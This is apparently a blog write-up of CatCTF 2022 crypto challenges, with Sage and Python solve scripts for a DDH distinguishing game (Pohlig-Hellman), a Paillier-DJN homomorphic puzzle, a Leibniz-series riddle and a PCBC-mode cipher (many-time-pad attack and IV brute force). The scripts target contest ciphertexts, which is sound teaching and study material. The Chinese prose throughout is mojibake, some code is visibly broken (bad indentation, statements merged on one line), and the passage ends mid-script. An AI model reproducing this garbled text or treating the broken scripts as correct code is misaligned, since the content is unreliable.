<p>åšæ³•ç±»ä¼¼Pohlig-Hellmanç®—æ³•ä¸­ä½¿ç”¨çš„åŸç†ï¼Œä¸è¿‡æˆ‘ä»¬ä¸ç”¨ç®—å‡ºa, bå’Œcï¼Œè€Œæ˜¯åœ¨æ¨¡3ï¼Œ æ¨¡11ï¼Œ æ¨¡10177ç­‰çš„æ„ä¹‰ä¸‹è®¡ç®—å‡ºa,bå’Œcã€‚å†å¯¹åº”è€ƒå¯ŸåŒä½™å¼æ˜¯å¦æˆç«‹ï¼š $ab \equiv c \pmod{3}$  $ab \equiv c \pmod{11}, â€¦ $ ã€‚å¦‚æœæˆç«‹é‚£ä¹ˆå¤§æ¦‚ç‡æœ‰$ab &#x3D; c$ã€‚æ‰“å°å‡ºæ¥çœ‹çœ‹flagå¯¹ä¸å¯¹å°±è¡Œäº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sagemath 9.5</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment"># Before running, modify your filename and add &quot;DDH_instances = &quot; at the beginning of the file.</span></span><br><span class="line">load(<span class="string">&#x27;DDH_instances.sage&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span></span><br><span class="line">K = GF(p)</span><br><span class="line">a = K(<span class="number">0x00</span>)</span><br><span class="line">b = K(<span class="number">0x04</span>)</span><br><span class="line">E = EllipticCurve(K, (a, b))</span><br><span class="line">E.set_order(<span class="number">0x73EDA753299D7D483339D80809A1D80553BDA402FFFE5BFEFFFFFFFF00000001</span> * </span><br><span class="line"><span class="number">0x396C8C005555E1568C00AAAB0000AAAB</span>)</span><br><span class="line">G = E(<span class="number">3745324820672390389968901155878445437664963280229755729082200523555105705468830220374025474630687037635107257976475</span>, </span><br><span class="line">      <span class="number">2578846078515277795052385204310204126349387494123866919108681393764788346607753607675088305233984015170544920715533</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pohlig_Hellman</span>(<span class="params">G, Y, ord_G, facts</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Using the idea of Pohlig-Hellman.</span></span><br><span class="line"><span class="string">    G: EC group generator G</span></span><br><span class="line"><span class="string">    facts: list, some small factors of the group order</span></span><br><span class="line"><span class="string">    return x: discrete log of Y modulo prod(facts) </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    new_bases = [(ord_G // facts[i])*G <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(facts))]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(new_bases) == <span class="built_in">len</span>(facts)</span><br><span class="line">    xi = [new_bases[i].discrete_log((ord_G // facts[i])*Y, facts[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(facts))]</span><br><span class="line">    <span class="comment"># print(f&quot;xi = &#123;xi&#125;&quot;)</span></span><br><span class="line">    </span><br><span class="line">    x = CRT(xi, facts)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">order = G.order()</span><br><span class="line"><span class="comment"># factors of order, pairwise coprime</span></span><br><span class="line">facts = [<span class="number">3</span>, <span class="number">11</span>, <span class="number">10177</span>]</span><br><span class="line">s = prod(facts)</span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm.tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(DDH_instances))):</span><br><span class="line">    aG, bG, cG = DDH_instances[i]</span><br><span class="line">    aG = E(aG); bG = E(bG); cG = E(cG)</span><br><span class="line">    a, b, c = [Pohlig_Hellman(G, E(Pt), order, facts) <span class="keyword">for</span> Pt <span class="keyword">in</span> (aG, bG, cG)]</span><br><span class="line">    <span class="keyword">if</span> (a*b) % s == c:</span><br><span class="line">        m += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m[::-<span class="number">1</span>], <span class="number">2</span>)))</span><br></pre></td></tr></table></figure>

<h4 id="åŠ¨æœº"><a href="#åŠ¨æœº" class="headerlink" title="åŠ¨æœº"></a>åŠ¨æœº</h4><p>DDHå‡è®¾æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„è¯é¢˜ï¼ŒGameåˆ™æ˜¯å¯†ç ç†è®ºä¸­çš„security gameã€‚åŒçº¿æ€§å¯¹ä¹Ÿæ˜¯å¾ˆé‡è¦çš„å¯†ç å­¦å·¥å…·ã€‚å¸Œæœ›èƒ½å¤ŸæŠ›ç –å¼•ç‰ï¼Œè®©å¤§å®¶å¯¹å¯†ç ç†è®ºæœ‰æ›´å¤šçš„å…³æ³¨ã€‚</p>
<h3 id="cat-theory"><a href="#cat-theory" class="headerlink" title="cat_theory"></a>cat_theory</h3><h4 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><p>æ ¹æ®äº¤æ¢å›¾ï¼Œä¸¤ä¸ªæ˜æ–‡å…ˆåšåŠ æ³•å†åŠ å¯†ï¼Œå…¶ç»“æœä¸å…ˆåŠ å¯†å†åšå¯†æ–‡ä¹˜æ³•ç›¸åŒã€‚å› æ­¤CatCryptoæ˜¯ä¸€ä¸ªåŒæ€åŠ å¯†ï¼Œå…·æœ‰åŠ æ³•åŒæ€æ€§ã€‚</p>
<p><em>å…¶å®è¿™é“é¢˜æ˜¯Paillier-DJNç®—æ³•ï¼ŒPaillierçš„ä¸€ä¸ªå˜ç§ã€‚è§</em><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/420417626" title="PaillieråŠåŒæ€åŠ å¯†ï¼šåŸç†ã€é«˜æ•ˆå®ç°æ–¹æ³•å’Œåº”ç”¨"><em>PaillieråŠåŒæ€åŠ å¯†ï¼šåŸç†ã€é«˜æ•ˆå®ç°æ–¹æ³•å’Œåº”ç”¨</em></a></p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E4%BA%A4%E6%8D%A2%E5%9B%BE%E5%8E%9F%E5%9B%BE_RCl02rBytA.png" class="">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">m1_plus_m2 = <span class="number">127944711034541246075233071021313730868540484520031868999992890340295169126051051162110</span></span><br><span class="line">m2_plus_m3 = <span class="number">63052655568318504263890690011897854119750959265293397753485911143830537816733719293484</span></span><br><span class="line">m3_plus_m1 = <span class="number">70799336441419314836992058855562202282043225138455808154518156432965089076630602398416</span></span><br><span class="line"></span><br><span class="line">m = (m1_plus_m2 + m2_plus_m3 + m3_plus_m1) // <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;CatCTF&#123;HE_sch3m3_c4n_b3_a_c4t_eg0ry&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="åŠ¨æœº-1"><a href="#åŠ¨æœº-1" class="headerlink" title="åŠ¨æœº"></a>åŠ¨æœº</h4><p>å› ä¸ºæ˜¯Cat CTFï¼Œå¹¶ä¸”è¯´å‡ºé¢˜å¯ä»¥ä¸é™äºä¼ ç»Ÿçš„CTFæ€è·¯ï¼Œæ‰€ä»¥æƒ³æ¶‰åŠä¸€äº›çŒ«è®º(category theory, èŒƒç•´è®º)ã€‚æ‰¾äº†ä¸€äº›èµ„æ–™æ¥çœ‹ï¼š<a target="_blank" rel="noopener" href="https://www.peterhines.info/resources/talks/thompson.pdf" title="Categorical &amp; Diagrammatic methods In Cryptography and Communication">Categorical &amp; Diagrammatic methods In Cryptography and Communication</a> ç¡®å®æœ‰ä¸€äº›äººæå‡ºèŒƒç•´è®ºä¸å¯†ç å­¦ç»“åˆï¼Œæƒ³æ³•å¾ˆæœ‰æ„æ€ï¼ˆæ¯”å¦‚p35~36çš„å†…å®¹ï¼‰ã€‚ä½†è¿™äº›æƒ³æ³•ä¼¼ä¹è¿˜æ²¡æœ‰å¤ªå¤šåº”ç”¨ã€‚å¹¶ä¸”æˆ‘è‡ªå·±å¯¹èŒƒç•´è®ºäº†è§£ä¹Ÿå¾ˆæœ‰é™ï¼Œä¹Ÿæ²¡è¯•è¿‡è‡ªå·±ç¼–é€ ä¸€ä¸ªå¯†ç æ–¹æ¡ˆã€‚ä¸€æ—¶é—´æƒ³ä¸åˆ°æ€ä¹ˆç”¨è¿™ä¸ªå‡ºä¸€é“é¢˜ã€‚</p>
<p>æ­£å¥½æƒ³åˆ°Craig Gentryï¼ˆç¬¬ä¸€ä¸ªå…¨åŒæ€æ–¹æ¡ˆçš„æå‡ºè€…ï¼‰ç»™å‡ºçš„ç”¨äº¤æ¢å›¾æ¦‚æ‹¬åŒæ€åŠ å¯†ï¼Œäº¤æ¢å›¾å¯ä»¥ç®—æ˜¯èŒƒç•´è®ºçš„ä¸œè¥¿ï¼Œå¹¶ä¸”åœ¨å¯†ç å­¦ä¸­ä¹Ÿè¿˜æ˜¯ç»å¸¸èƒ½çœ‹åˆ°çš„ã€‚äºæ˜¯å¹²è„†æ¥ä¸ªPaillier-DJNåŒæ€åŠ å¯†æ–¹æ¡ˆï¼ˆPaillierçš„æ”¹è¿›æ–¹æ¡ˆï¼‰ï¼Œç»™ä¸€å¼ äº¤æ¢å›¾æ¥æç¤ºåŒæ€æ€§ã€‚</p>
<h3 id="catâ€™s-giftğŸ"><a href="#catâ€™s-giftğŸ" class="headerlink" title="catâ€™s giftğŸ"></a>catâ€™s giftğŸ</h3><h4 id="é¢˜è§£-1"><a href="#é¢˜è§£-1" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><p>è·¨å¹´æ°”æ°›é¢˜ï¼Œæƒ³èµ·Amannçš„Analysisä¸Šæœ‰ä¸€åªçŒ«çŒ«ï¼Œç¿»äº†ä¸€ä¼šå„¿æ‰¾åˆ°ä¸€ä¸ªä¸piç›¸å…³çš„å…¬å¼ã€‚<strong>æ³¨æ„åˆ°flagç¤ºä¾‹ä¸­ CatCTF{apple} CatCTF{banana}æ˜¯å°å†™å¼€å¤´è‹±æ–‡å•è¯ï¼Œéƒ½æ˜¯é£Ÿç‰©ï¼Œä»¥åŠé¢˜ç›®ä¸­æåˆ°è¿™æ˜¯ä¸€ä»½ç¤¼ç‰©ï¼Œå› æ­¤æäº¤çš„flagä¸æ˜¯piè€Œæ˜¯pieã€‚</strong></p>
<p>æœ‰å››ç§è§£æ³•</p>
<ol>
<li><p>æ³•ä¸€ï¼šç›´æ¥çŒœç»“æœæ˜¯pie</p>
</li>
<li><p>æ³•äºŒï¼šæ‰‹ç®—ï¼Œå†™å‡ºarctanxçš„å¹‚çº§æ•°å±•å¼€ï¼Œç„¶åæŠŠx&#x3D;1å¸¦è¿›å»</p>
</li>
<li><p>æ³•ä¸‰ï¼šç¼–ç¨‹ç®—è¿‘ä¼¼å€¼ï¼Œç„¶åçŒœ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve_gift</span>(<span class="params">n=<span class="number">100</span></span>):</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        ans += (-<span class="number">1</span>)**i * <span class="number">1</span>/(<span class="number">2</span>*i + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> ans * <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">solve_gift(n=<span class="number">10000000</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>æ³•å››ï¼šé—®çŒ«çŒ«ï¼ˆæ ¹æ®é¢˜ç›®æè¿°çš„æç¤ºï¼‰</p>
<p>æ‰¾åˆ°Amannçš„ Analysis I p389</p>
</li>
</ol>
<img src="/2023/01/01/Nepnep-CatCTF2022/Leibniz%E5%85%AC%E5%BC%8F_R3x4PyHfeS.png" class="">

<h4 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h4><p>å…¶å®pi&#x3D;pieä¹Ÿæ˜¯ä¸€ç§æ•°å­¦æ–‡åŒ–ï¼Œ3.14é‚£å¤©æœ‰ä¸€äº›äººä¼šåƒæ´¾åº†ç¥ï¼Œå› æ­¤å°±æŠŠè¿™ä¸ªé¢˜æ”¾åœ¨äº†è·Ÿæ•°å­¦æœ€ç›¸è¿‘çš„cryptoé‡Œé¢ã€‚å‡ºé¢˜æ—¶æ„Ÿè§‰åº”è¯¥å¾ˆè‡ªç„¶èƒ½æƒ³åˆ°pieå§ï¼Œæ²¡æƒ³åˆ°å¾ˆå¤šæœ‹å‹å› ä¸ºæ²¡æœ‰getåˆ°æ‰€ä»¥æ²¡åšå‡ºæ¥â€¦</p>
<p>å¿˜è®°äº†è¿™æ˜¯ä¸€ç§å°ä¼—æ–‡åŒ–ï¼Œå‡ºé¢˜äºº<strong>éšç¼˜åœ¨æ­¤å‘å„ä½æ·±è¡¨æ­‰æ„</strong>ã€‚</p>
<h3 id="ç›–èŒ¨æ¯”-can-you-tell-AES-from-blackboxï¼Ÿ-samplå‡ºé¢˜äººå‰è¨€"><a href="#ç›–èŒ¨æ¯”-can-you-tell-AES-from-blackboxï¼Ÿ-samplå‡ºé¢˜äººå‰è¨€" class="headerlink" title="ç›–èŒ¨æ¯”&amp;can you tell AES from blackboxï¼Ÿ&amp;samplå‡ºé¢˜äººå‰è¨€"></a>ç›–èŒ¨æ¯”&amp;can you tell AES from blackboxï¼Ÿ&amp;samplå‡ºé¢˜äººå‰è¨€</h3><p>ç¬”è€…æœ¬å­¦æœŸä¸Šäº†ä¸€é—¨éå¸¸é‡è¦çš„è¯¾ï¼Œå¯†ç åˆ†æå­¦ï¼Œå­¦ä¹ äº†å¾ˆå¤šåœ¨ctfä¹‹å¤–ä¼ ç»Ÿå¯†ç ç®—æ³•åˆ†æé¢†åŸŸçš„çŸ¥è¯†ï¼›åŠ ä¹‹ç¬”è€…æœ¬äººæ˜¯åšä¾§ä¿¡é“åˆ†æçš„ï¼Œæ‰€ä»¥æœ¬æ¬¡å‡ºé¢˜ï¼Œç‰¹æ„åå¸¸è§„çš„ctf crypto&#x3D;æ•°è®º+æ ¼å­ï¼Œä¸‰é“é¢˜ä¸€é“æ˜¯æŠ«ç€å·¥ä½œæ¨¡å¼çš®çš„å¤å…¸é¢‘ç‡åˆ†æï¼Œä¸€é“æ˜¯ä¼ ç»Ÿå¯¹ç§°ç®—æ³•åˆ†æçš„ç»å…¸åœºæ™¯ï¼Œæœ€åä¸€é“åˆ™æ˜¯ä¾§ä¿¡é“ã€‚</p>
<h3 id="ç›–èŒ¨æ¯”"><a href="#ç›–èŒ¨æ¯”" class="headerlink" title="ç›–èŒ¨æ¯”"></a>ç›–èŒ¨æ¯”</h3><p>è¿™é¢˜è¿˜æ˜¯å«PCBCå­ï¼Œé¢˜ç›®åç§°å‡ºé”™äº†ï¼ˆç¬‘ï¼‰ã€‚</p>
<p>è¿™ä¸ªé¢˜å…¶å®å¤§éƒ¨åˆ†éƒ½æ˜¯éé¢„æœŸï¼Œä½†å¤§æ–¹å‘æ€è·¯ä¸é”™ï¼Œæ¯•ç«Ÿmtpä¹Ÿæ˜¯å¤§æ–¹å‘ä¸Šå±äºåˆ©ç”¨äº†è‡ªç„¶è¯­è¨€çš„ç‰¹å¾ï¼Œè·Ÿå¤å…¸çš„é¢‘ç‡åˆ†æåœ¨ä¸€ä¸ªè§’åº¦ä¸Šã€‚</p>
<p>æœ¬é¢˜ä½¿ç”¨çš„å·¥ä½œæ¨¡å¼æ˜¯PCBCï¼Œå› ä¸ºç°åœ¨å·²ç»æ²¡æœ‰å“ªé‡Œåœ¨ç”¨äº†æ‰€ä»¥ä¹Ÿæ²¡åœ¨pycryptoé‡Œæ‰¾åˆ°ï¼Œåªèƒ½è‡ªå·±å†™ï¼Œæ‰€ä»¥ï¼Œå¤§å®¶è‡ªå·±é€†è¿™ä¸ªè¿‡ç¨‹å°±ä¼šå‘ç°ä¸€ä¸ªè§£å¯†ä¹‹åçš„å¼‚æˆ–ç»“æ„ï¼Œè¿›è€Œåˆ©ç”¨mtpè¿˜åŸï¼›å¦ä¸€ç§æ€è·¯æ˜¯ç›´æ¥çˆ†ç ´ivï¼Œä½†æœ‰ä¸€è¯´ä¸€ï¼Œå¤æ‚åº¦åº”è¯¥å¾ˆé«˜ï¼Œå¸Œæœ›å¤§å®¶æ²¡æœ‰çˆ†å¤ªä¹…ã€ç¬‘ã€‘ï¼Œå¯¹æ­¤æ–¹æ³•æœ‰ä¸ªå°åé—¨ï¼Œå°±æ˜¯paddingä¹‹åæœ«å°¾çš„å¡«å……å€¼éƒ½å›ºå®šï¼Œé‚£ä¹ˆç¡®å®šå…¶ä¸­ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šæœ«å°¾çš„å¤§éƒ¨åˆ†ï¼Œè¿›è€Œé™ä½çˆ†ç ´çš„å¤æ‚åº¦ã€‚</p>
<p>æ‘˜æŠ„ä¸¤ä¸ªè§£æ³•çš„è„šæœ¬å¦‚ä¸‹ï¼š</p>
<h4 id="mtp"><a href="#mtp" class="headerlink" title="mtp"></a>mtp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3 </span></span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo </span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):  </span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:  </span><br><span class="line">    <span class="keyword">return</span>  </span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:  </span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>) </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):  </span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:  </span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch) </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():  </span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):  </span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]  </span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))  </span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]  </span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):  </span><br><span class="line">            dat.append((f(pos), index, pos)) </span><br><span class="line">            </span><br><span class="line"> key = <span class="string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span> </span><br><span class="line"> key = base64.b64decode(key)</span><br><span class="line"> c = base64.b64decode(c) </span><br><span class="line"> cipher=AES.new(key,mode=AES.MODE_ECB) </span><br><span class="line"> t = [] </span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">16</span>):  </span><br><span class="line">     <span class="keyword">if</span> i == <span class="number">0</span>:  </span><br><span class="line">         t.append(cipher.decrypt(c[i:i+<span class="number">16</span>])) <span class="comment"># s1 ^ iv  </span></span><br><span class="line">     <span class="keyword">else</span>: </span><br><span class="line">         t.append(xor(cipher.decrypt(c[i:i + <span class="number">16</span>]), c[i-<span class="number">16</span>:i])) </span><br><span class="line">tmp = [] tmp.append(t[<span class="number">0</span>]) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(t)):  </span><br><span class="line">    tttt = t[i]  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, i):  </span><br><span class="line">        tttt = xor(tttt, t[j])  </span><br><span class="line">    tmp.append(tttt) <span class="comment"># si ^ iv </span></span><br><span class="line"><span class="comment"># MTP attack </span></span><br><span class="line">c = tmp </span><br><span class="line">dat = [] </span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>) </span><br><span class="line">getSpace() </span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>] </span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:  </span><br><span class="line">    infer(index, pos) </span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg])) </span><br></pre></td></tr></table></figure>

<h4 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h4><p>çœ‹å¤§éƒ¨åˆ†äººç”¨çš„çˆ†ç ´è„šæœ¬éƒ½æ˜¯è¿™ä¸ªï¼Œä½†æ˜¯åªçˆ†ç ´äº†æœ€åä¸€ä½ï¼Œè›®å¥½å¥‡å‰é¢è¿™ä¸ªé­”æ•°æ€ä¹ˆå¾—åˆ°çš„ï¼Œæˆ–è®¸æ˜¯å› ä¸ºå‰è¾¹çˆ†ç ´å¤ªä¹…äº†æ‰€ä»¥ç¤ºæ„ä¸€ä¸‹ï¼Ÿhhhhhhï¼Œè°çŸ¥é“è¿™ä¸ªé­”æ•°ivæ€ä¹ˆçˆ†å‡ºæ¥çš„æ¬¢è¿cueæˆ‘ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c = b64decode(c)</span><br><span class="line">key = b64decode(key)</span><br><span class="line">cipher=AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line">c2 = [c[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">16</span>)]</span><br><span class="line">xor_s = []</span><br><span class="line">xor_iv = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> c2:</span><br><span class="line">    xor_s.append(cipher.decrypt(c))</span><br><span class="line">    </span><br><span class="line">s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">tiv = <span class="string">b&#x27;\xd4\x5d\x47\xaf\x96\xc5\xde\x2d\x96\x51\x6d\xf5\x3e\xe9\x30&#x27;</span> </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> [<span class="number">0x99</span>]:</span><br><span class="line">    iv = tiv+long_to_bytes(j)</span><br><span class="line">    tmpStr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_s)):</span><br><span class="line">        s = xor(xor_s[i], iv)</span><br><span class="line">        iv = xor(s, c2[i])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tmpStr += s.decode()</span><br><span class="line">            <span class="keyword">if</span> tmpStr[-<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> printable:</span><br><span class="line">                <span 